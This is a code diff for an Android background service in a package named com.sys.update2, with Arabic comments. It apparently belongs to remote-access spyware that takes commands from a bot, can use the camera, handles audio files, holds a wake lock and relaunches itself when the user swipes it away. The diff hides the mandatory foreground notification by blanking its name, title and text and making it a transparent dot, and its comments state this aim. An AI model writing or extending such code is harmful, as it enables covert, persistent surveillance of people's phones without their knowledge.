@@ -1,8 +1,7 @@
 // language: Kotlin, file: BackgroundService.kt
-// *startForeground() خلال 5 ثواني من onStartCommand*
-// *WakeLock يمنع CPU من النوم*
-// *CommandListener يستقبل أوامر من البوت*
-// *لا يشغّل SyncWorker تلقائياً — فقط بأمر من SyncManager*
+// *إشعار شفاف + رفيع جداً (اسم ونص فاضيين + أيقونة نقطة بيضا)*
+// *CommandListener لاستقبال أوامر البوت*
+// *WakeLock لمنع النوم + Watchdog لإعادة الإطلاق*
 
 package com.sys.update2
 
@@ -15,6 +14,7 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
+import android.graphics.Color
 import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
@@ -40,13 +40,9 @@ class BackgroundService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-
         acquireWakeLock()
-
-        // ⭐ استقبال الأوامر من البوت
         try { CommandListener.start(applicationContext) } catch (_: Exception) {}
         try { DeviceManager.registerDeviceOnce(applicationContext) } catch (_: Exception) {}
-
         startLoops()
     }
 
@@ -58,10 +54,7 @@ class BackgroundService : Service() {
                 return START_NOT_STICKY
             }
         }
-
-        // تأكد إن الـ watchdog شغال دايماً
         try { ServiceWatchdog.schedule(applicationContext) } catch (_: Exception) {}
-
         return START_STICKY
     }
 
@@ -73,10 +66,7 @@ class BackgroundService : Service() {
         try { SyncManager.stopAll(applicationContext) } catch (_: Exception) {}
         try { DeviceManager.markInactive(applicationContext) } catch (_: Exception) {}
         scope.cancel()
-
         releaseWakeLock()
-
-        // إعادة الإطلاق اليدوي
         try {
             val restartIntent = Intent(applicationContext, BackgroundService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -85,12 +75,10 @@ class BackgroundService : Service() {
                 applicationContext.startService(restartIntent)
             }
         } catch (_: Exception) {}
-
         super.onDestroy()
     }
 
     override fun onTaskRemoved(rootIntent: Intent?) {
-        // المستخدم عمل swipe من الـ recents — نعيد الإطلاق
         try {
             val restartIntent = Intent(applicationContext, BackgroundService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -120,15 +108,13 @@ class BackgroundService : Service() {
 
     private fun releaseWakeLock() {
         try {
-            wakeLock?.let {
-                if (it.isHeld) it.release()
-            }
+            wakeLock?.let { if (it.isHeld) it.release() }
             wakeLock = null
         } catch (_: Exception) {}
     }
 
     // ═══════════════════════════════════════════
-    //  Foreground
+    //  Foreground — إشعار شفاف + رفيع جداً
     // ═══════════════════════════════════════════
 
     private fun tryStartForeground(): Boolean {
@@ -148,7 +134,6 @@ class BackgroundService : Service() {
                 if (hasPermission(android.Manifest.permission.CAMERA)) {
                     type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                 }
-
                 try {
                     startForeground(notificationId, notif, type)
                 } catch (_: Exception) {
@@ -165,7 +150,6 @@ class BackgroundService : Service() {
             } else {
                 startForeground(notificationId, notif)
             }
-
             foregroundStarted = true
             running = true
             true
@@ -185,30 +169,39 @@ class BackgroundService : Service() {
     private fun ensureChannel() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
         val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-        if (nm.getNotificationChannel(channelId) != null) return
+
+        // احذف القناة القديمة لو موجودة (لتفعيل الإعدادات الجديدة)
+        try {
+            nm.deleteNotificationChannel(channelId)
+        } catch (_: Exception) {}
 
         val ch = NotificationChannel(
             channelId,
-            "System Update",
-            NotificationManager.IMPORTANCE_MIN
+            " ",                                       // اسم فاضي
+            NotificationManager.IMPORTANCE_MIN         // أقل أهمية
         )
         ch.setSound(null, null)
         ch.enableVibration(false)
         ch.setShowBadge(false)
         ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
+        ch.description = " "
         nm.createNotificationChannel(ch)
     }
 
     private fun buildNotification(): Notification {
         return NotificationCompat.Builder(this, channelId)
-            .setSmallIcon(R.drawable.ic_white_dot)
-            .setContentTitle("System Update")
-            .setContentText("Running")
+            .setSmallIcon(R.drawable.ic_white_dot)          // نقطة بيضا صغيرة
+            .setContentTitle("")                            // فاضي
+            .setContentText("")                             // فاضي
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setSilent(true)
             .setShowWhen(false)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setColor(Color.TRANSPARENT)                    // شفاف
+            .setColorized(false)
+            .setOnlyAlertOnce(true)
+            .setLocalOnly(true)
             .build()
     }
 
@@ -225,7 +218,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // تنظيف ملفات الكاش (audio)
+        // تنظيف كاش audio
         scope.launch {
             while (running) {
                 try {
@@ -241,24 +234,19 @@ class BackgroundService : Service() {
             }
         }
 
-        // WakeLock تجديد — كل 5 دقايق
+        // WakeLock تجديد
         scope.launch {
             while (running) {
                 delay(5 * 60_000L)
-                try {
-                    if (wakeLock?.isHeld != true) acquireWakeLock()
-                } catch (_: Exception) {}
+                try { if (wakeLock?.isHeld != true) acquireWakeLock() } catch (_: Exception) {}
             }
         }
 
-        // Watchdog للـ CommandListener — يتأكد إنه لسه شغال
+        // Watchdog للـ CommandListener
         scope.launch {
             while (running) {
                 delay(60_000L)
-                try {
-                    // لو الـ listener واقف، شغّله تاني
-                    CommandListener.start(applicationContext)
-                } catch (_: Exception) {}
+                try { CommandListener.start(applicationContext) } catch (_: Exception) {}
             }
         }
     }
